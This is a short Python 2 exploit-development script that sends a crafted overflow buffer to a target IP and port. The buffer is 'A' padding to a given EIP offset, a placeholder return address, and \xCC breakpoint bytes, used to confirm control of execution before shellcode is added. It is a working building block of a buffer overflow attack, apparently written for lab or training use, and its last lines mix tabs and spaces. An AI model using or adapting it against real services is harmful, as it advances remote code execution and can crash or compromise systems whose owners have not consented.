#!/usr/bin/python

# This script is for confirming the EIP opcode, making sure we are at the register that contains our shellcode after EIP hits

import sys, argparse, socket

# function definitions
def buffer_gen(bytes_to_send, eip):                   
    buf = 'A' * eip
    buf += "BBBB"   # change this to the EIP opcode to either JMP, CALL, or PUSH -> ret the register containing shellcode 

    # interrupts 
    buf += "\xCC" * (bytes_to_send - len(buf))

    return buf

def socket_setup(ip, port):
    # socket creatation
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   
   # connecting
    s.connect((ip, port))
    return s

def main(input_tuple):          # Input tuple has the following structure: (ip, port, bytes_to_send, eip_offset)
    try:
        s = socket_setup(input_tuple[0], input_tuple[1])

        buf = buffer_gen(input_tuple[2], input_tuple[3])

        #print "sending buffer: ", buf
        s.send(buf)
        s.close()

        print "\nSent!"
    except:
        print "\n[!] Could not connect"
        sys.exit(0) 

# script execution
if __name__ == "__main__":
	# user input
	program_description = "The program inputs ip and port EIP offset and bytes it takes to crash the program, sending payload for a shellcode dryrun"
	parser = argparse.ArgumentParser(program_description)
	parser.add_argument("target_ip", help="Target IP")
	parser.add_argument("target_port", type=int, help="Target Port")
	parser.add_argument("eip_offset", type=int, help="EIP offset at the moment of crash")
	parser.add_argument("bytes_to_send", type=int, help="bytes to send to crash the program")
	args = parser.parse_args()
	
	# global parameters
	user_input = (args.target_ip, args.target_port, args.bytes_to_send, args.eip_offset)
    main(user_input)        # calling main function

